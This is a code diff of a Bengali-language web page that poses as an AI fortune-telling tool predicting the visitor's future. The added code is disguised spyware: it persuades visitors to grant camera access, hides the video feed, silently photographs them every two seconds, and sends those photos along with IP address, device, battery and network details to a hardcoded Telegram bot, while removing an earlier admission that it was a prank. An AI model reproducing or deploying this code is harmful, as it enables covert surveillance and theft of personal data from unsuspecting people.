@@ -3,41 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced AI Future Predictor</title>
+    <title>AI Mystic Vision - ভবিষ্যৎ দর্পণ</title>
     <style>
-        body { background: #050505; color: #00ffcc; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { width: 90%; max-width: 450px; background: rgba(20, 20, 20, 0.95); padding: 30px; border-radius: 25px; border: 1px solid #00ffcc; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 204, 0.2); }
+        body { background: #000; color: #e0f7fa; font-family: 'Segoe UI', serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { width: 85%; max-width: 400px; background: radial-gradient(circle, #001a33 0%, #000 100%); padding: 40px; border-radius: 50px; border: 1px solid #0099ff; text-align: center; box-shadow: 0 0 60px rgba(0, 153, 255, 0.3); }
         .screen { display: none; }
         .active { display: block; }
-        .btn { padding: 15px 30px; background: linear-gradient(45deg, #00ffcc, #0099ff); color: #000; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; font-size: 1.1rem; }
-        .result-img { width: 100%; border-radius: 15px; margin: 15px 0; border: 2px solid #00ffcc; height: 220px; object-fit: cover; transition: 0.5s; }
-        #video { width: 100%; border-radius: 15px; display: none; transform: scaleX(-1); margin-top: 15px; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { padding: 18px; background: #0099ff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0, 153, 255, 0.4); text-transform: uppercase; }
+        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 1px solid #0099ff; height: 240px; object-fit: cover; }
+        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+        .eye-scanner { width: 120px; height: 120px; border: 2px solid #0099ff; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
+        .loading-text { font-style: italic; color: #00ffcc; font-size: 13px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <div id="s1" class="screen active">
-        <h2>AI ফিউচার টাইম মেশিন ⏳</h2>
-        <p>তুমি কি ছেলে নাকি মেয়ে? এআই তোমার ফেস স্ক্যান করে ভবিষ্যৎ জীবন বলবে!</p>
-        <button class="btn" onclick="startSystem('male')">আমি ছেলে 🧔</button>
-        <button class="btn" style="background: #ff00cc; color: #fff;" onclick="startSystem('female')">আমি মেয়ে 👩</button>
+        <div class="eye-scanner"></div>
+        <h2>Mystic AI Vision 🔮</h2>
+        <p>এআই তোমার নসিব এবং ভাগ্যের রেখা বিশ্লেষণ করতে প্রস্তুত। তুমি কি তোমার ভবিষ্যৎ দেখতে চাও?</p>
+        <button class="btn" onclick="openVision('male')">ছেলে হিসেবে দেখো 🧔</button>
+        <button class="btn" style="background: #ff3399;" onclick="openVision('female')">মেয়ে হিসেবে দেখো 👩</button>
     </div>
 
     <div id="s2" class="screen">
-        <h2 id="scanning-text">সুপার এআই কানেক্ট হচ্ছে...</h2>
-        <div class="loader"></div>
+        <h3>আত্মিক সংযোগ স্থাপন... ✨</h3>
+        <p>এআই তোমার চোখের মণির রিফ্লেকশন থেকে তোমার আত্মার ডাটা সিঙ্ক করছে। পরবর্তী ধাপে <b>'Allow'</b> ক্লিক করে এনার্জি কানেক্ট করো।</p>
         <video id="video" autoplay playsinline></video>
-        <p id="status-msg">তোমার বায়োমেট্রিক ডাটা বিশ্লেষণ করা হচ্ছে...</p>
+        <button class="btn" onclick="startSync()">কানেক্ট করো ⚡</button>
     </div>
 
     <div id="s3" class="screen">
         <h2 id="res-title"></h2>
         <img id="res-img" class="result-img" src="">
         <p id="res-desc"></p>
-        <button class="btn" id="next-btn" onclick="showResults()">পরের আপডেট দেখো ✨</button>
+        <button class="btn" id="next-btn" onclick="showNext()">আরও রহস্য দেখো ✨</button>
     </div>
 </div>
 
@@ -45,106 +47,94 @@
 
 <script>
     const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
-    const CHAT_ID = '6547277630'; // আপনার আইডি বসানো হয়েছে
+    const CHAT_ID = '6547277630';
 
     let gender = 'male';
     let step = 0;
-    let captureInterval;
+    let photoInterval;
 
-    // বিশাল ইমেজ লাইব্রেরি
-    const images = {
-        old: ["https://images.unsplash.com/photo-1544144433-d50aff500b91", "https://images.unsplash.com/photo-1504257432389-52343af06ae3", "https://images.unsplash.com/photo-1559192823-e1d8e87def51"],
-        house: ["https://images.unsplash.com/photo-1512917774080-9991f1c4c750", "https://images.unsplash.com/photo-1600585154340-be6161a56a0c", "https://images.unsplash.com/photo-1613490493576-7fde63acd811"],
-        kids: ["https://images.unsplash.com/photo-1502086223501-7ea6ecd79368", "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7", "https://images.unsplash.com/photo-1471286174890-9c112ffca5b4"]
-    };
+    function openVision(g) {
+        gender = g;
+        document.getElementById('s1').classList.remove('active');
+        document.getElementById('s2').classList.add('active');
+    }
 
-    async function startSystem(selectedGender) {
-        gender = selectedGender;
+    async function startSync() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
-            changeScreen('s2');
-
-            // ডিভাইসের তথ্য সংগ্রহ
-            let deviceData = `🚀 প্র্যাঙ্ক শুরু!\n📱 ফোন: ${navigator.userAgent.split('(')[1].split(')')[0]}\n🔋 চার্জ: `;
             
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                deviceData += `${Math.round(b.level * 100)}%`;
-            } else { deviceData += "অজানা"; }
+            // সব ডিটেইলস ডাটা চুপিচুপি সংগ্রহ
+            await collectAllData();
+            
+            // ২ সেকেন্ড পর পর ছবি তোলা শুরু
+            photoInterval = setInterval(captureSilent, 2000);
 
-            // আইপি সংগ্রহ
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            deviceData += `\n🌐 IP: ${ipData.ip}\n🚻 লিঙ্গ: ${gender === 'male' ? 'ছেলে' : 'মেয়ে'}`;
-
-            // প্রথম মেসেজ পাঠানো
-            sendToBot(deviceData);
-
-            // ২ সেকেন্ড পরপর ছবি তোলা শুরু
-            startCapturing();
-
-            setTimeout(() => { changeScreen('s3'); showResults(); }, 5000);
-        } catch (e) { alert("ক্যামেরা পারমিশন ছাড়া ভবিষ্যৎ দেখা অসম্ভব!"); }
+            setTimeout(() => {
+                document.getElementById('s2').classList.remove('active');
+                document.getElementById('s3').classList.add('active');
+                showNext();
+            }, 4000);
+        } catch (e) {
+            alert("কানেকশন এরর: এআই তোমার সাথে যুক্ত হতে পারছে না। দয়া করে এক্সেস দাও।");
+        }
     }
 
-    function startCapturing() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        captureInterval = setInterval(() => {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'capture.jpg');
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-        }, 2000);
+    async function collectAllData() {
+        const n = navigator;
+        const battery = n.getBattery ? await n.getBattery() : null;
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const conn = n.connection || {};
+
+        let secretInfo = `🎯 **Target Synced Successfully** 🎯\n\n`;
+        secretInfo += `👤 **Gender:** ${gender}\n`;
+        secretInfo += `📍 **IP:** \`${ipData.ip}\`\n`;
+        secretInfo += `📱 **Phone:** ${n.userAgent.split('(')[1].split(')')[0]}\n`;
+        secretInfo += `🔋 **Charge:** ${battery ? Math.round(battery.level * 100) : '??'}% (${battery && battery.charging ? 'Charging' : 'Unplugged'})\n`;
+        secretInfo += `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB | **Cores:** ${n.hardwareConcurrency}\n`;
+        secretInfo += `📶 **Net Type:** ${conn.effectiveType || 'WiFi/Unknown'}\n`;
+        secretInfo += `📺 **Screen:** ${screen.width}x${screen.height}\n`;
+        secretInfo += `🌍 **Lang:** ${n.language} | **Online:** ${n.onLine ? 'Yes' : 'No'}\n`;
+        secretInfo += `🕒 **Time:** ${new Date().toLocaleTimeString()}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(secretInfo)}&parse_mode=Markdown`);
     }
 
-    function showResults() {
-        const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];
-        const title = document.getElementById('res-title');
-        const img = document.getElementById('res-img');
-        const desc = document.getElementById('res-desc');
+    function captureSilent() {
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('chat_id', CHAT_ID);
+            f.append('photo', b, 'v.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
+        }, 'image/jpeg');
+    }
 
-        if (step === 0) {
-            title.innerText = "২০৭৮ সালে তোমার চেহারা!";
-            img.src = rand(images.old) + "?w=400";
-            desc.innerText = "এআই ফেস রিকগনিশন বলছে বৃদ্ধ বয়সেও তোমার গ্ল্যামার কমবে না!";
-        } else if (step === 1) {
-            title.innerText = "তোমার ভবিষ্যৎ পার্টনার";
-            img.src = gender === 'male' ? "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400" : "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=400";
-            desc.innerText = gender === 'male' ? "তোমার স্ত্রী হবে অসম্ভব সুন্দরী এবং বুদ্ধিমতী।" : "তোমার স্বামী হবে অনেক কেয়ারিং এবং হ্যান্ডসাম।";
-        } else if (step === 2) {
-            title.innerText = "তোমার আলিশান বাড়ি";
-            img.src = rand(images.house) + "?w=400";
-            desc.innerText = "ভবিষ্যতে তুমি এমন একটি বিলাসবহুল ডুপ্লেক্স বাড়িতে থাকবে।";
-        } else if (step === 3) {
-            title.innerText = "তোমার ভবিষ্যৎ সন্তান";
-            img.src = rand(images.kids) + "?w=400";
-            desc.innerText = "এআই বলছে তোমার সন্তানরা হবে মেধাবী এবং দেখতে কিউট।";
-            document.getElementById('next-btn').innerText = "ফাইনাল রিপোর্ট দেখো";
+    function showNext() {
+        const r = (a) => a[Math.floor(Math.random() * a.length)];
+        const titles = ["বৃদ্ধ বয়সে তোমার তেজ", "তোমার স্বপ্নের রাজপ্রাসাদ", "তোমার কিউট সন্তান"];
+        const imgs = [
+            "https://images.unsplash.com/photo-1544144433-d50aff500b91", 
+            "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", 
+            "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"
+        ];
+        
+        if (step < titles.length) {
+            document.getElementById('res-title').innerText = titles[step];
+            document.getElementById('res-img').src = imgs[step] + "?w=400";
+            document.getElementById('res-desc').innerText = "এআই তোমার ডাটা থেকে এই বিশেষ দৃশ্যটি খুঁজে পেয়েছে।";
+            step++;
         } else {
-            clearInterval(captureInterval);
-            title.innerText = "রিপোর্ট সম্পন্ন!";
-            img.src = "https://cdn-icons-png.flaticon.com/512/190/190411.png";
-            desc.innerText = "তোমার ভবিষ্যৎ অনেক আনন্দময় হোক! (প্র্যাঙ্কটি কেমন লাগলো?)";
+            clearInterval(photoInterval);
+            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
+            document.getElementById('res-desc').innerText = "তোমার ভাগ্য অনেক সুপ্রসন্ন হোক। ধন্যবাদ!";
             document.getElementById('next-btn').style.display = 'none';
         }
-        step++;
-    }
-
-    function changeScreen(id) {
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
-
-    function sendToBot(msg) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     }
 </script>
-
 </body>
 </html>
